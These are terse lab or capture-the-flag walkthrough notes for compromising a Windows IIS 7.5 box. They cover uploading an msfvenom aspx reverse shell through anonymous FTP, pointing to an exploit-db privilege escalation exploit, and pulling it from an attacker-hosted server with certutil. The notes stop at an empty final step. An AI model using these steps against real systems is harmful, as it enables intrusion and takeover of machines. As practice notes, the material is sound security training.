Step 1 (Scanning)
- machine has been scanned using Nmap
- machine has been reverted and re-scanned

Step 2 (Enumeration)
- target has anonymous ftp enabled and web server which reads files in the ftp client
- the iis version is 7.5 meaning its from ~2008 build meaning aspx will likely run

Step 3 (Foot hold)
- make aspx reverse shell using msfvenom and upload to ftp server
- access shell from browser to execute

Step 4 (Enumeration)
- 'systeminfo' shows us the OS build
- searching for priviledge escalaition based on OS we find:
- https://www.exploit-db.com/exploits/40564
- compile according to script notes.
- run 'python -m SimpleHTTPServer 80' to host file in http format.

Step 5 (Priviledge escalation)
- upload compild file using 'certutil -urlcache -f http://<ip>:<port>/<file>'.
- run script for system level access.

Step 6 (Host enumeration)
